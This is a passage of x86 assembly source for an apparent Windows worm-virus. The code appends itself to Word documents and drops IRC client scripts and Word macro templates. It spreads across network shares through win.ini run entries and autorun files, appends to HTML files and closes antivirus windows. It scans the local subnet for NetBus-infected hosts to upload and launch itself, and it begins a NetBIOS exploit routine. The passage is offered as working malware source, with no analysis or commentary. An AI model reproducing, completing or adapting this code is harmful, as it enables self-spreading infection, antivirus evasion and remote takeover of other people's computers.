   cmp     byte ptr [eax], '"'
   jne     loop_space
   inc     eax
   ugh_one_more_loop:
   inc     eax
   cmp     byte ptr [eax],'"'
   jne     ugh_one_more_loop
   jmp     bef_loop_dot
   loop_space:
   inc     eax
   cmp     byte ptr [eax], " "
   jne     loop_space
   bef_loop_dot:
   xor     ecx,ecx
   loop_dot:
   inc     ecx
   inc     eax
   cmp     ecx,128d
   je      quit_it
   cmp     byte ptr [eax], "."
   jne     loop_dot
   inc     eax
   cmp     word ptr [eax], "OD"
   je      doc_infection
   cmp     byte ptr [eax+2], "C"
   je      doc_infection
   cmp     word ptr [eax], "od"
   jne     quit_it
   cmp     byte ptr [eax+2], "c"
   jne     quit_it

   doc_infection:

   ;Document infection starts here

   push    260d
   push    offset mmsys_value
   call    GetSystemDirectoryA

   push    offset mmsys_text_2
   push    offset mmsys_value
   call    lstrcatA

   lea     esi, mmsys_value
   mov     ecx,GENERIC_READ or GENERIC_WRITE
   call    open_file
   mov     dword ptr [exe_filehandle],eax
   cmp     eax,0
   je      quit_it


   mov     eax,dword ptr [command_line]
   cmp     byte ptr [eax], '"'
   je      get_doc_name_loop_1
   no_quote_loop:
   inc     eax
   cmp     byte ptr [eax], " "
   jne     no_quote_loop
   inc     eax
   jmp     ok_it_is_done
   get_doc_name_loop_1:
   inc     eax
   cmp     byte ptr [eax], '"'
   jne     get_doc_name_loop_1
   inc     eax
   inc     eax

   ok_it_is_done:

   mov     esi, eax
   mov     ecx,GENERIC_READ or GENERIC_WRITE
   call    open_file
   mov     dword ptr [doc_filehandle],eax
   cmp     eax,0
   je      quit_it


   call    get_sizes

   mov     eax, dword ptr [exe_memory]
   mov     ebx, dword ptr [exe_filehandle]
   call    CreateMap
   mov     dword ptr [exe_maphandle], eax
   test    eax,eax
   jz      close_file

   mov     eax, dword ptr [doc_memory]
   mov     ebx, dword ptr [doc_filehandle]
   call    CreateMap
   mov     dword ptr [doc_maphandle], eax
   test    eax,eax
   jz      close_file

   mov     eax, dword ptr [exe_maphandle]
   call    CreateView
   mov     dword ptr [exe_mapaddress], eax

   mov     eax, dword ptr [doc_maphandle]
   call    CreateView
   mov     dword ptr [doc_mapaddress], eax
   mov     eax,dword ptr [doc_size]
   mov     ebx,dword ptr [exe_size]
   cmp     eax,ebx
   jbe     not_infected
   mov     eax, dword ptr [doc_mapaddress]
   add     eax,dword ptr [doc_size]
   sub     eax,dword ptr [exe_size]
   cmp     word ptr [eax], "ZM"
   je      doc_infected

   not_infected:

   mov     eax, dword ptr [doc_mapaddress]
   add     eax, dword ptr [doc_size]

   mov     edi,eax
   mov     esi, dword ptr [exe_mapaddress]
   mov     ecx,dword ptr [exe_size]
   cld
   rep     movsb

   mov     eax, dword ptr [exe_size]
   add     eax, dword ptr [doc_size]
   jmp     close_up_doc

   doc_infected:

   mov     eax, dword ptr [doc_size]
   close_up_doc:
   push    0
   push    0
   push    eax
   push    dword ptr [doc_filehandle]
   call    SetFilePointer

   push    dword ptr [doc_filehandle]
   call    SetEndOfFile

   Unmap_view:
   push    dword ptr [exe_mapaddress]
   call    UnmapViewOfFile
   push    dword ptr [doc_mapaddress]
   call    UnmapViewOfFile

   close_map:
   push    dword ptr [exe_maphandle]
   call    CloseHandle
   push    dword ptr [doc_maphandle]
   call    CloseHandle

   close_file:
   push    dword ptr [exe_filehandle]
   call    CloseHandle
   push    dword ptr [doc_filehandle]
   call    CloseHandle
   jmp     payload

   quit_it:

   mov      eax, dword ptr [command_line]
   cmp      byte ptr [eax],'"'
   jne      win_nt

   loop:
   inc      eax
   cmp      byte ptr [eax], '"'
   jne      loop

   find_dot:
   inc      eax
   cmp      byte ptr [eax], '.'
   jne      find_dot

   find_slash:
   dec      eax
   cmp      byte ptr [eax], '\'
   jne      find_slash
   inc      eax

   all_check:

   push     eax

   xor      esi,esi
   loopes:


   ;IRC
   cmp      dword ptr [eax],"CRIM"
   je       mirc_drop
   cmp      dword ptr [eax],"crim"
   je       mirc_drop

   cmp      dword ptr [eax],"CRIP"
   je       pirch_drop
   cmp      dword ptr [eax],"crip"
   je       pirch_drop

   cmp      dword ptr [eax],"CRIV"
   je       virc_drop
   cmp      dword ptr [eax],"criv"
   je       virc_drop

   ;AV
   cmp      dword ptr [eax],"EGER"
   je       payload
   cmp      dword ptr [eax],"eger"
   je       payload
   cmp      dword ptr [eax],"3PVA"
   je       payload
   cmp      dword ptr [eax],"3pva"
   je       payload
   cmp      dword ptr [eax],"MPVA"
   je       payload
   cmp      dword ptr [eax],"mpva"
   je       payload
   cmp      dword ptr [eax],"CPVA"
   je       payload
   cmp      dword ptr [eax],"3DON"
   je       payload
   cmp      dword ptr [eax],"NOMA"
   je       payload
   cmp      dword ptr [eax],"NACS"
   je       payload
   cmp      dword ptr [eax],"nacs"
   je       payload
   cmp      dword ptr [eax],"DIPS"
   je       payload
   cmp      dword ptr [eax],"EWRD"
   je       payload

   ;DROPPER
   cmp      dword ptr [eax],"CARC"
   je       a_dropper
   cmp      dword ptr [eax],"KCAP"
   je       a_dropper
   cmp      dword ptr [eax],"YSMM"
   je       a_dropper
   cmp      dword ptr [eax],"UTES"
   je       a_dropper
   cmp      dword ptr [eax],"utes"
   je       a_dropper

   inc      esi
   inc      eax
   cmp      esi,10
   jne      loopes

   execute:

   pop      eax

   jmp      done

   win_nt:

   loopy:
   inc      eax
   cmp      byte ptr [eax]," "
   jne      loopy
   find_dot_nt:
   inc      eax
   cmp      byte ptr [eax], '.'
   jne      find_dot_nt
   find_slash_nt:
   dec      eax
   cmp      byte ptr [eax], '\'
   jne      find_slash_nt
   inc      eax

   jmp      all_check

   done:

   mov      eax, dword ptr [command_line]
   keep_inc:
   cmp     byte ptr [eax],'"'
   jne     nt_cl
   inc     eax
   cmp     byte ptr [eax], '"'
   jne     keep_inc
   find_da_dot:
   inc     eax
   jmp     copy_cl

   nt_cl:

   de_looper:
   inc     eax
   cmp     byte ptr [eax], 20h
   jne     de_looper
   inc     eax

   copy_cl:

   mov     esi,eax
   lea     edi,shitty
   mov     ecx,260
   rep     movsb

   push     offset Org_Dir
   call     SetCurrentDirectoryA

   lea      eax,start_info
   push     eax
   call     GetStartupInfoA


   xor      edx,edx
   push     offset process_info
   push     offset start_info
   push     edx
   push     edx
   push     edx
   push     edx
   push     edx
   push     edx
   push     offset shitty
   push     edx
   call     CreateProcessA


   ; Here starts rest of worm functions


   lea     eax,ThisFile
   xor     ecx,ecx
   loop_exst:
   inc     eax
   inc     ecx
   cmp     ecx,128d
   je      not_bin
   cmp     dword ptr [eax],"NIB."
   jne     loop_exst

   found_exst:
   dec     eax
   cmp     byte ptr [eax], "\"
   jne     found_exst
   inc     eax

   mov     esi,eax
   lea     edi,ThisFile_2
   mov     ecx,32
   rep     movsb


   reg_code:

   ;----RegCode---
   push     offset hKey
   push     offset lpsKey
   push     HKEY_CURRENT_USER
   call     RegCreateKeyA

   push     offset key_len
   push     offset key_data
   push     offset key_type
   push     0h
   push     0h
   push     [hKey]
   call     RegQueryValueExA
   cmp      eax, 0
   jne      get_office2k

   push     [hKey]
   call     RegCloseKey

   push     offset hKey
   push     offset subkey_1
   push     HKEY_CURRENT_USER
   call     RegCreateKeyA

   push     word97value_len
   push     offset word97value
   push     REG_SZ
   push     0h
   push     offset sec_name
   push     [hKey]
   call     RegSetValueExA

   push     [hKey]
   call     RegCloseKey

   call     drop_macro_stuff


   ;---new---
   get_office2k:

   push     offset hKey
   push     offset subkey_3
   push     HKEY_CURRENT_USER
   call     RegCreateKeyA

   push     offset key2_len
   lea      eax, [key2_data+1]
   push     eax
   push     offset key_type
   push     0h
   push     offset app_data
   push     [hKey]
   call     RegQueryValueExA
   ;cmp      eax, 0
   ;jne      not_bin

   push     offset key3_len
   lea      eax, [key3_data+1]
   push     eax
   push     offset key_type
   push     0h
   push     offset templates_data
   push     [hKey]
   call     RegQueryValueExA
   ;cmp      eax, 0
   ;jne      not_bin

   push     [hKey]
   call     RegCloseKey


   ;*NEW* Added for compatibility with word2k on Win2k

   push     offset hKey
   push     offset subkey_4
   push     HKEY_CURRENT_USER
   call     RegCreateKeyA

   push     offset key_len
   lea      eax, [key_data]
   push     eax
   push     offset key_type
   push     0h
   push     offset app_data2
   push     [hKey]
   call     RegQueryValueExA
   ;cmp      eax, 0
   ;jne      not_bin

   push     [hKey]
   call     RegCloseKey



   push     offset micro_copy
   push     offset key_data
   call     lstrcatA

   push     offset key3_data
   push     offset key_data
   call     lstrcatA

   call     drop_macro_stuff

   ;

   lea      edi, key_data
   mov      ecx, 260d
   mov      al, 0
   rep      stosb

   push     260d
   push     offset key_data
   call     GetWindowsDirectoryA

   push     offset key2_data
   push     offset key_data
   call     lstrcatA

   push     offset micro_copy
   push     offset key_data
   call     lstrcatA

   push     offset key3_data
   push     offset key_data
   call     lstrcatA

   call     drop_macro_stuff

   push     offset hKey
   push     offset subkey_2
   push     HKEY_CURRENT_USER
   call     RegCreateKeyA

   push     [office2k_value_len]
   push     offset office2k_value
   push     REG_DWORD
   push     0h
   push     offset o2k_name
   push     [hKey]
   call     RegSetValueExA

   push     [hKey]
   call     RegCloseKey

   lea      edi, key_data
   mov      ecx, 260d
   mov      al, 0
   rep      stosb

   lea      edi, key_data
   mov      ecx, 260d
   mov      al, 0
   rep      stosb

   push     offset hKey
   push     offset subkey_5
   push     HKEY_CURRENT_USER
   call     RegCreateKeyA

   push     offset key_len
   lea      eax, key_data
   push     eax
   push     offset key_type
   push     0h
   push     offset app_data2
   push     [hKey]
   call     RegQueryValueExA
   ;cmp      eax, 0
   ;jne      not_bin

   push     [hKey]
   call     RegCloseKey

   push     offset micro_copy
   push     offset key_data
   call     lstrcatA

   push     offset key3_data
   push     offset key_data
   call     lstrcatA

   call     drop_macro_stuff

   not_bin:

   mov     word ptr [auto_runner],0

   mov     eax, dword ptr [command_line]
   cmp     byte ptr [eax],'"'
   jne     has_no_quotes
   inc     eax
   has_no_quotes:
   mov     esi,eax
   lea     edi,started_from
   mov     ecx,2
   rep     movsb

   looper:
   inc      eax
   cmp     byte ptr [eax], "."
   jne     looper

   cmp     [eax-4],"xten"
   jne     after_auto


   call    exec_explorer

   after_auto:

   ;jmp     network_found

   jmp     restore_seh
   exception_handler:
   mov     esp,dword ptr [esp+8]
   restore_seh:
   pop     dword ptr fs:[0]
   add     esp,4

   xor     ebx,ebx
   lea     eax,exception_handler_2
   push    eax
   push    dword ptr fs:[ebx]
   mov     dword ptr fs:[ebx],esp

   ; Special greets goes to Bozo!

   mov     dword ptr [inet_enum],0

   network_travel:

   call    GetProcessHeap
   test    eax,eax
   je      fin_network

   push    4000h
   push    8h
   push    eax
   call    HeapAlloc

   mov     dword ptr [alloc_heap],eax

   mov     dword ptr [all_tries],0
   net_loop:
   call    travel_user
   inc     dword ptr [all_tries]
   cmp     dword ptr [all_tries],4
   jne     net_loop

   cmp     dword ptr [inet_enum],1
   jne     on_lan

   ret

   on_lan:

   jmp     fin_network



   travel_user:

   mov     dword ptr [net_tries],0
   try_again:
   inc     dword ptr [net_tries]
   cmp     dword ptr [net_tries],4
   je      end_travel_user

   xor     ebx,ebx
   find_resource:
   call    enum_net
   or      eax,eax
   jnz     try_again

   mov     eax,dword ptr [alloc_heap]

   mov     dword ptr [enum_count],1ffh

   push    eax
   call    enum_resource
   pop     ebx
   test    eax,eax
   jnz     try_again

   mov     ecx,dword ptr [enum_count]

   cmp     dword ptr [inet_enum],1
   je      no_randomize_pick

   call    GetTickCount
   xor     edx,edx
   div     ecx
   mov     eax,20h
   mul     edx
   add     ebx,eax

   no_randomize_pick:

   test    dword ptr [ebx+0ch],01h
   jz      find_resource

   pushad

   got_resource:
   mov     esi,dword ptr [ebx+14h]         ; here it is
   mov     eax,offset new_path
   push    esi                             ; path to network or dir
   push    eax                             ; where to copy
   call    lstrcpy

   ;push    0
   ;push    offset new_path
   ;push    offset new_path
   ;push    0
   ;call    MessageBoxA

   popad


   call    connect_resource

   get_next_share:
   add     ebx,20h
   test    dword ptr [ebx+0ch],01h
   jnz     got_one
   jmp     try_again

   got_one:

   call    connect_resource

   jmp     get_next_share


   fin_network:
   jmp     restore_seh_2
   exception_handler_2:
   mov     esp,dword ptr [esp+8]
   restore_seh_2:
   pop     dword ptr fs:[0]
   add     esp,4

   push     offset Org_Dir
   call     SetCurrentDirectoryA

   mov      dword ptr [nr_to_inf], 5
   call     html_it

   lea      eax, WIN_AVP
   call     find_close_window

   lea      eax, WIN_AMON
   call     find_close_window

   lea      eax, WIN_NORTON_1
   call     find_close_window

   lea      eax, WIN_NORTON_2
   call     find_close_window

   push     offset hKey
   push     offset res_reg_key
   push     HKEY_CURRENT_USER
   call     RegCreateKeyA

   push     offset res_len
   push     offset res_data
   push     offset key_type
   push     0h
   push     offset res_name
   push     [hKey]
   call     RegQueryValueExA
   cmp      eax, 0
   jne      no_active_search

   lea      eax,res_data
   cmp      dword ptr [eax], "!SEY"
   je       past_program_done


   no_active_search:


   push     res_active_value_len
   push     offset res_active_value
   push     REG_SZ
   push     0h
   push     offset res_name
   push     [hKey]
   call     RegSetValueExA

   push     [hKey]
   call     RegCloseKey

   mov     dword ptr [backdoor_spawned],0

   virus_exec_done:

   lea     eax,process_info
   push    dword ptr [eax.PI_dwProcessId]
   push    0
   push    PROCESS_ALL_ACCESS
   call    OpenProcess

   mov     dword ptr [ProcessHandle],eax

   wait_for_program:

   push    offset check_program
   push    dword ptr [ProcessHandle]
   call    GetExitCodeProcess

   cmp     dword ptr [check_program],STILL_ACTIVE
   jne     program_done

   call    ip_range_scanner
   call    spawn_backdoor

   push    (10*(1*1000))     ; 10 seconds
   call    Sleep

   jmp     wait_for_program

   program_done:

   push    0h
   push    dword ptr [thread_hnd]
   call    TerminateThread

   push    offset hKey
   push    offset res_reg_key
   push    HKEY_CURRENT_USER
   call    RegCreateKeyA

   push    res_deactive_value_len
   push    offset res_deactive_value
   push    REG_SZ
   push    0h
   push    offset res_name
   push    [hKey]
   call    RegSetValueExA

   push    [hKey]
   call    RegCloseKey

   past_program_done:

   jmp     payload



   ;----RegCode-------

   drop_macro_stuff:

   push    260d
   push    offset Sys_dir
   call    GetSystemDirectoryA
   push    offset Sys_dir
   call    SetCurrentDirectoryA

   push    0
   push    FILE_ATTRIBUTE_NORMAL
   push    CREATE_ALWAYS
   push    offset pseudo_desc2
   push    0
   push    GENERIC_READ or GENERIC_WRITE
   push    offset argument2
   call    CreateFileA

   cmp     eax, INVALID_HANDLE_VALUE
   jz      error_office

   mov     dword ptr [filehandle_],eax

   lea     eax,macro_code_start
   mov     ecx,macro_code_len
   call    write_file
   mov     eax,dword ptr [filehandle_]
   call    close_file_



   push    offset key_data
   call    SetCurrentDirectoryA

   push    0
   push    FILE_ATTRIBUTE_NORMAL
   push    CREATE_ALWAYS
   push    offset pseudo_desc2
   push    0
   push    GENERIC_READ or GENERIC_WRITE
   push    offset normal_dot
   call    CreateFileA
   mov     dword ptr [filehandle_],eax
   lea     eax,normal_start
   mov     ecx,normal_len
   call    write_file
   mov     eax,dword ptr [filehandle_]
   call    close_file_
   error_office:
   ret



   connect_resource:
   inc     byte ptr [drive_letter]
   next_drive:
   dec     byte ptr [drive_letter]
   mov     dword ptr [ebx+16],offset drive_letter
   cmp     byte ptr [drive_letter], "C"
   je      no_more_drives
   push    ebx
   push    0FF000000h
   push    0
   push    offset Password
   push    ebx
   call    WNetAddConnection2A
   cmp     eax,ERROR_ALREADY_ASSIGNED
   je      next_drive
   call    infect_drive
   no_more_drives:
   pop     ebx
   ret
   end_travel_user:
   ret

   enum_net:

   push    offset enum_handle
   push    ebx
   push    large 3
   push    large 1
   push    large 2
   call    WNetOpenEnumA
   ret

   enum_resource:

   cmp     dword ptr [inet_enum],1
   jne     lan_enum

   lea     edx,ascii_ip
   mov     dword ptr [eax+20d],edx


   lan_enum:

   push    offset enum_size
   push    eax
   push    offset enum_count
   push    dword ptr [enum_handle]
   call    WNetEnumResourceA
   ret

   infect_drive:

   pushad

   find_wind:

   jmp     set_z_drive

   cont_z_drive:

   push     offset win_ini_dir_1
   call     SetCurrentDirectoryA
   test     eax,eax
   jne      found_win_dir

   push     offset win_ini_dir_2
   call     SetCurrentDirectoryA
   test     eax,eax
   jne      found_win_dir

   push     offset win_ini_dir_3
   call     SetCurrentDirectoryA
   test     eax,eax
   jne      found_win_dir

   push     offset win_ini_dir_4
   call     SetCurrentDirectoryA
   test     eax,eax
   jne      found_win_dir

   push     offset win_ini_dir_5
   call     SetCurrentDirectoryA
   test     eax,eax
   jne      found_win_dir

   push     offset win_ini_dir_6
   call     SetCurrentDirectoryA
   test     eax,eax
   jne      found_win_dir

   push     offset win_ini_dir_7
   call     SetCurrentDirectoryA
   test     eax,eax
   jne      found_win_dir

   jmp      no_win_dir

   found_win_dir:

   push     offset Current_Dir
   push     260
   call     GetCurrentDirectoryA
   lea      edi,Current_Dir
   xor      eax,eax
   mov      al,'C'
   stosb


   ;push    0
   ;push    offset Current_Dir
   ;push    offset Current_Dir
   ;push    0
   ;call    MessageBoxA

   push     offset win_ini_dir
   push     260
   call     GetCurrentDirectoryA

   push     offset NetVir_ad
   push     offset Current_Dir
   call     lstrcatA

   push     offset win_ini
   push     offset win_ini_dir
   call     lstrcatA

   push     offset win_ini_dir
   push     offset Current_Dir
   push     offset ini_run
   push     offset ini_autorun
   call     WritePrivateProfileStringA

   lea      esi,NetVir
   lea      edi,DestDrop
   mov      ecx,10
   rep      movsb

   call     drop_virus

   no_win_dir:

   push    1
   push    0
   push    offset drive_letter
   call    WNetCancelConnection2A

   popad
   ret



   a_dropper:

   push     10h
   Push     offset virus_cap
   Push     offset virus_mess
   Push     0h
   call     MessageBoxA


   payload:

   call    GetTickCount
   and     eax,2666d
   cmp     eax,4
   jne     final_exit

   push    offset new_label
   push    0h
   call    SetVolumeLabelA


   final_exit:

   push     0h
   call     ExitProcess


   drop_files:

   mirc_drop:

   push     offset Org_Dir
   call     SetCurrentDirectoryA

   lea      eax,file_1
   call     create_file
   lea      eax,mirc_start
   mov      ecx,mirc_len
   call     write_file
   mov      eax,dword ptr [filehandle_]
   call     close_file_

   lea      eax,file_6
   call     create_file
   lea      eax,mirc_start
   mov      ecx,mirc_len
   call     write_file
   mov      eax,dword ptr [filehandle_]
   call     close_file_


   lea      esi,DestVir
   lea      edi,DestDrop
   mov      ecx,10
   rep      movsb

   call     drop_virus

   jmp      execute

   pirch_drop:

   push     offset Org_Dir
   call     SetCurrentDirectoryA

   lea      eax,file_2
   call     create_file
   lea      eax,pirch_start
   mov      ecx,pirch_len
   call     write_file
   mov      eax,dword ptr [filehandle_]
   call     close_file_

   lea      esi,DestVir
   lea      edi,DestDrop
   mov      ecx,10
   rep      movsb

   call     drop_virus


   jmp      execute

   virc_drop:

   push     offset Org_Dir
   call     SetCurrentDirectoryA

   lea      eax,file_5
   call     create_file
   lea      eax,virc_start
   mov      ecx,virc_len
   call     write_file
   mov      eax,dword ptr [filehandle_]
   call     close_file_

   lea      esi,DestVir
   lea      edi,DestDrop
   mov      ecx,10
   rep      movsb

   call     drop_virus


   jmp      execute


   create_file:
   push     0
   push     80h
   push     2
   push     0
   push     1
   push     40000000h
   push     eax
   call     CreateFileA
   mov      dword ptr [filehandle_],eax
   ret

   write_file:
   push     0
   lea      ebx, num_bytes_written
   push     ebx
   push     ecx
   push     eax
   push     dword ptr [filehandle_]
   call     WriteFile
   ret

   close_file_:
   push     eax
   call     CloseHandle
   ret

   drop_virus:
   push     0h
   push     offset DestDrop
   push     offset ThisFile
   call     CopyFileA
   ret

   find_close_window:
   push     eax
   xor      ebx,ebx
   push     ebx
   call     FindWindowA
   mov      edx,eax
   cmp      eax,0
   jne      close_window
   ret
   close_window:
   push     ebx
   push     ebx
   push     12h
   push     eax
   call     PostMessageA
   ret

   set_dir:
   push     edx
   call     SetCurrentDirectoryA
   ret

   set_z_drive:
   push     offset Z_drive
   call     SetCurrentDirectoryA
   test     eax,eax
   je       no_win_dir

   ;lea      esi,NetVir_2
   ;lea      edi,DestDrop
   ;mov      ecx,10
   ;rep      movsb

   ;call     drop_virus
   call     drop_autorun

   jmp      cont_z_drive

   html_it:

   push    offset search
   push    offset html_files
   call    FindFirstFileA
   cmp     eax,-1
   je      no_file_found
   mov     dword ptr [search_handle],eax

   lea     edi, search
   lea     esi, [edi.FileName]

   call    Infect_html

   find_next:
   lea     edi, search
   lea     edi, [edi.FileName]
   mov     ecx, 13d
   mov     al, 0
   rep     stosb


   push    offset search
   mov     eax,dword ptr [search_handle]
   push    eax
   call    FindNextFileA

   test    eax, eax
   jz      no_file_found
   lea     edi, search
   lea     esi, [edi.FileName]
   call    Infect_html
   jc      error_inf
   dec     dword ptr [nr_to_inf]
   cmp     dword ptr [nr_to_inf], 0
   jne     find_next

   error_inf:
   cmp     dword ptr [nr_to_inf], 0
   jne     find_next

   no_file_found:
   ret

   Infect_html:

   push     0
   push     0
   push     3
   push     0
   push     1
   push     80000000h or 40000000h
   push     esi
   call     CreateFileA
   mov      dword ptr [filehandle_],eax

   push     2
   push     0
   push     -16
   push     dword ptr [filehandle_]
   call     SetFilePointer
   lea      eax,html_start
   mov      ecx,html_len
   call     write_file
   mov      eax,dword ptr [filehandle_]
   call     close_file_

   lea      esi,NetVir_2
   lea      edi,DestDrop
   mov      ecx,10
   rep      movsb

   call     drop_virus

   ret

   exec_explorer:

   lea     eax, started_from
   cmp     byte ptr [eax],20h
   je      no_drive

   mov       word ptr [auto_runner],1

   push      260d
   push      offset win_dir
   call      GetWindowsDirectoryA

   push     offset explorer_file
   push     offset win_dir
   call     lstrcatA

   push     offset started_from
   push     offset win_dir
   call     lstrcatA

   push     offset start_info
   call     GetStartupInfoA

   push     offset process_info
   push     offset start_info
   push     0
   push     0
   push     67108928h
   push     0
   push     0
   push     0
   push     offset win_dir
   push     0
   call     CreateProcessA
   no_drive:

   ret

   drop_autorun:

   push     offset inf_dir
   push     260
   call     GetCurrentDirectoryA

   push     offset inf_ad
   push     offset inf_dir
   call     lstrcatA

   lea      esi,NetVir_3
   lea      edi,DestDrop
   mov      ecx,10
   rep      movsb

   call     drop_virus

   push     offset inf_dir
   push     offset NetVir_3
   push     offset inf_open
   push     offset inf_autorun
   call     WritePrivateProfileStringA
   ret

   ;Document infection procedures

   open_file:
   push    0
   push    0
   push    3
   push    0
   push    1
   push    ecx
   push    esi
   call    CreateFileA
   ret

   get_sizes:

   push    0
   push    dword ptr [exe_filehandle]
   call    GetFileSize
   mov     dword ptr [exe_size],eax
   mov     dword ptr [exe_memory],eax

   push    0
   push    dword ptr [doc_filehandle]
   call    GetFileSize
   mov     dword ptr [doc_size],eax
   add     eax, dword ptr [exe_size]
   mov     dword ptr [doc_memory],eax
   ret

   CreateMap:
   xor     esi,esi
   push    esi
   push    eax
   push    esi
   push    4
   push    esi
   push    ebx
   call    CreateFileMappingA
   ret

   CreateView:
   push    esi
   push    esi
   push    esi
   push    2
   push    eax
   call    MapViewOfFile
   cmp     eax, esi
   je      close_map
   ret


   ip_range_scanner:

   lea     eax,online_window1
   call    find_window
   test    eax,eax
   jne     user_online

   lea     eax,online_window2
   call    find_window
   test    eax,eax
   jne     user_online

   lea     eax,online_window3
   call    find_window
   test    eax,eax
   jne     user_online

   lea     eax,online_window4
   call    find_window
   test    eax,eax
   jne     user_online

   lea     eax,online_window5
   call    find_window
   test    eax,eax
   jne     user_online

   lea     eax,online_window6
   call    find_window
   test    eax,eax
   jne     user_online

   lea     eax,online_window7
   call    find_window
   test    eax,eax
   jne     user_online

   jmp     not_connected

   user_online:

   push    offset wsa_data ; Pointer to WSA data structure
   push    VERSION1_1      ; We want to use winsock ver 1.1
   call    WSAStartup      ; Start up winsocks
   test    eax,eax         ; ERROR?
   jne     close_wsa   ; if so bail out

   ;call    WSACleanup


   ; Create the socket that we're going to use for sending
   ; *OUTPUT SOCKET*

   call    create_socket
   inc     eax             ;
   test    eax,eax         ;ERROR? if si bail out
   je      close_sockets
   dec     eax
   mov     dword ptr [send_socket],eax ; save the handle of our socket

   call    create_socket
   inc     eax             ;
   test    eax,eax         ;ERROR? if so bail out
   je      close_wsa
   dec     eax
   mov     dword ptr [recv_socket],eax ; save the handle of our socket

   call    create_socket
   inc     eax             ;
   test    eax,eax         ;ERROR? if so bail out
   je      close_wsa
   dec     eax
   mov     dword ptr [netbios_socket],eax ; save the handle of our socket


   lea     edi,sock_addr_in_1    ; EDI = sock_add structure
   lea     esi,sock_addr_in_2    ; EDI = sock_add structure

   push    netbus_port1 ; Port in decimal
   call    htons           ; convert it to big endian format (hex n reversed)
   mov     word ptr [edi+2d],ax ; fill PORT in structure
   mov     word ptr [netbus_port1_s],ax

   push    netbus_port2 ; Port in decimal
   call    htons           ; convert it to big endian format (hex n reversed)
   mov     word ptr [esi+2d],ax ; fill PORT in structure
   mov     word ptr [netbus_port2_s],ax

   lea     esi,sock_addr_in_4    ; EDI = sock_add structure

   push    netbios_port ; Port in decimal
   call    htons           ; convert it to big endian format (hex n reversed)
   mov     word ptr [esi+2d],ax ; fill PORT in structure
   mov     word ptr [netbios_port_s],ax

   push    260d                            ; size of buffer
   push    offset host_name                ; PTR to buffer
   call    gethostname                     ; get out Hostname

   pushad

   ;push    0
   ;push    offset host_name
   ;push    offset host_name
   ;push    0
   ;call    MessageBoxA

   popad


   lea     eax,host_name                 ; Buffer with host domain name
   call    get_host_ip                   ; Call procedure that will get IP
   test    eax,eax
   je      close_sockets

   mov     esi,dword ptr [eax+12]        ; ESI = Pointer to table in  hostent
                                         ; structure
   lodsd                                 ; EAX = Pointer to IP


   mov     eax,dword ptr [eax]           ; EAX = IP

   and     eax, 00FFFFFFh                ; Clear Class-C subnet

   cmp     dword ptr [last_ip], 0
   jne     use_last_ip

   xor     ecx,ecx
   mov     ecx,255d
   sub     eax,1000000h
   jmp     class_c_subnet_loop

   use_last_ip:
   mov     ecx, dword ptr [last_ip]

   xor     ebx,ebx
   mov     ebx,255
   sub     ebx,ecx
   imul    ebx,ebx,1000000h
   add     eax,ebx
   jmp     past_add

   class_c_subnet_loop:
   add     eax,1000000h                  ; Increase Class-C with 1 ((a+1).b.c.d)

   past_add:

   pushad
   call    check_range                   ; scan current IP
   popad

   dec     ecx
   mov     dword ptr [last_ip],ecx
   jmp     close_sockets

   close_sockets:
   push    dword ptr [send_socket]      ; Close out open socket
   call    closesocket
   push    dword ptr [recv_socket]      ; Close out open socket
   call    closesocket
   push    dword ptr [netbios_socket]      ; Close out open socket
   call    closesocket
   close_wsa:

   call    WSACleanup     ; Reset the WSA
   jmp     not_connected

   check_range:

   push    eax
   lea     edi,sock_addr_in_1    ; EDI = sock_add structure
   lea     esi,sock_addr_in_2    ; EDI = sock_add structure

   mov     word ptr [edi],AF_INET ; *BUG FIX*
   mov     word ptr [esi],AF_INET ; *BUG FIX*

   mov     dword ptr [edi+4],eax         ; Save IP in the sock_addr_in_1 structure
   mov     dword ptr [esi+4],eax         ; Save IP in the sock_addr_in_2 structure

   ;Set the righ port values to the socket address structure.

   xor     eax,eax
   mov     ax,word ptr [netbus_port1_s]
   mov     word ptr [edi+2d],ax ; fill PORT in structure
   mov     ax,word ptr [netbus_port2_s]
   mov     word ptr [esi+2d],ax ; fill PORT in structure

   pop     eax
   push    eax
   lea     esi,sock_addr_in_4    ; EDI = sock_add structure
   mov     dword ptr [esi+4],eax         ; Save IP in the sock_addr_in_2 structure
   xor     eax,eax
   mov     ax,word ptr [netbios_port_s]
   mov     word ptr [esi+2d],ax ; fill PORT in structure


   ; Test netbus port

   lea     edi,sock_addr_in_1    ; EDI = sock_add structure
   push    sock_addr_in_len
   push    edi
   push    dword ptr [send_socket]
   call    connect
   test    eax,eax
   je      found_trojan


   test_netbios:

   lea     edi,sock_addr_in_4    ; EDI = sock_add structure
   push    sock_addr_in_len
   push    edi
   push    dword ptr [netbios_socket]
   call    connect
   test    eax,eax
   je      netbios_exploit

   pop     eax

   jmp     next_ip

   found_trojan:

   pop     eax

   lea     ebx,con_buffer
   call    clear_buffer

   push    0h
   push    260d
   push    ebx
   push    dword ptr [send_socket]
   call    recv
   test    eax,eax
   je      next_ip
   inc     eax
   jz      next_ip
   dec     eax


   ;Netbus REPLY = "NetBus 1.ver [x] (ver = 1.53, 1.6 etc etc) if passworded [x]"

   cmp     dword ptr [ebx], "BteN"
   je      found_netbus_server

   jmp     next_ip

   found_netbus_server:

   mov     ecx,eax
   xor     edx,edx
   find_password:
   cmp     byte ptr [ebx+edx], "x"
   je      send_password
   inc     edx
   loop    find_password
   jmp     no_pass

   send_password:

   mov     ecx,netbus_password_len
   lea     eax,netbus_password
   call    send_command

   lea     ebx,con_buffer
   call    clear_buffer

   push    0h
   push    260d
   push    ebx
   push    dword ptr [send_socket]
   call    recv
   test    eax,eax
   je      next_ip
   inc     eax
   jz      next_ip
   dec     eax

   ;REPLY = "Acess;1"

   cmp     byte ptr [ebx+7], "1"
   jne     next_ip

   no_pass:

   mov     ecx,netbus_upload_len
   lea     eax,netbus_upload
   call    send_command

   lea     ebx,con_buffer
   call    clear_buffer

   push    0h
   push    260d
   push    ebx
   push    dword ptr [send_socket]
   call    recv
   test    eax,eax
   je      next_ip
   inc     eax
   jz      next_ip
   dec     eax

   ; REPLY: UploadReady ?

   cmp     dword ptr [ebx+6],"daeR"
   jne     next_ip

   call    send_virus
   cmp     eax,-1
   je      next_ip

   mov     ecx,netbus_startapp_len
   lea     eax,netbus_startapp
   call    send_command

   mov     ecx,netbus_remove_len
   lea     eax,netbus_remove
   call    send_command

   next_ip:
   ret

   netbios_exploit:
   pop     eax

   push    eax         ; IP in Network byte order (hex reversed)
   call    inet_ntoa   ; Convert the IP to x.x.x.x ASCII readability

   push    eax         ; address to IP in memory -> stack

